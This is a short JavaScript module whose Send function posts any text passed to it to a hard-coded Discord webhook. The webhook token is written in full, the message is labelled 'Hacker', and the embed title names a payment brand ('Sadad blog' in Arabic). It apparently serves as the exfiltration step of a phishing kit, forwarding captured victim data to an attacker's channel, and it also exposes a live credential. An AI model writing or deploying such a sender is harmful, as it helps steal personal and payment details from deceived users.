import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328675737615728692/QZC8LjO4C89BVqU5ARShoMAzvF2xl4S09NC6f6dN-v-lLn58uhHYJ31-H7EQctxwaz4R",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
